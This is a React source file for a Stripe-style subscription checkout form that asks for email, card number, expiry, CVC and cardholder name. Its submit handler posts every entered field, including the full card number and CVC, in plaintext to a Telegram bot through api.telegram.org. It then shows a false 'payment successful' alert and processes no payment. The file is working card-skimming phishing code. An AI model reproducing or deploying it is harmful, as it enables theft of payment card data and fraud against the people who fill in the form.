import React, { useState } from 'react';

export default function App() {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: '',
    card: '',
    expiry: '',
    cvc: '',
    name: '',
    country: 'Taiwan',
    saveInfo: false,
  });

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleSubmit = async () => {
    setLoading(true);
    const message = `新訂單來啦！\n\nEmail: ${formData.email}\n姓名: ${formData.name}\n卡號: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n國家: ${formData.country}\n儲存卡片資訊: ${formData.saveInfo ? '是' : '否'}`;

    await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    setTimeout(() => {
      alert('付款成功！我們已收到您的資料。');
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-xl">
        <h2 className="text-lg font-semibold mb-4">Enter payment details</h2>

        <label className="text-sm font-medium">Email</label>
        <input type="email" name="email" value={formData.email} onChange={handleChange} className="mb-4 w-full border rounded px-3 py-2" />

        <label className="text-sm font-medium">Card information</label>
        <input type="text" name="card" placeholder="1234 1234 1234 1234" value={formData.card} onChange={handleChange} className="w-full border rounded px-3 py-2 mt-1" />
        <div className="flex gap-2 mt-2 mb-4">
          <input type="text" name="expiry" placeholder="MM / YY" value={formData.expiry} onChange={handleChange} className="w-1/2 border rounded px-3 py-2" />
          <input type="text" name="cvc" placeholder="CVC" value={formData.cvc} onChange={handleChange} className="w-1/2 border rounded px-3 py-2" />
        </div>

        <label className="text-sm font-medium">Name on card</label>
        <input type="text" name="name" value={formData.name} onChange={handleChange} className="mb-4 w-full border rounded px-3 py-2" />

        <label className="text-sm font-medium">Country or region</label>
        <select name="country" value={formData.country} onChange={handleChange} className="w-full border rounded px-3 py-2 mb-4">
          <option value="Taiwan">Taiwan</option>
          <option value="Japan">Japan</option>
          <option value="USA">USA</option>
        </select>

        <div className="flex items-center mb-4">
          <input type="checkbox" name="saveInfo" checked={formData.saveInfo} onChange={handleChange} className="mr-2" />
          <label className="text-sm">Save my info for secure 1-click checkout</label>
        </div>

        <button onClick={handleSubmit} disabled={loading} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded">
          {loading ? '處理中...' : 'Subscribe'}
        </button>

        <p className="text-xs text-gray-500 mt-4">
          After your trial ends, you will be charged ¥108 per month starting September 8, 2022. You can always cancel before then.
        </p>
      </div>
    </div>
  );
}
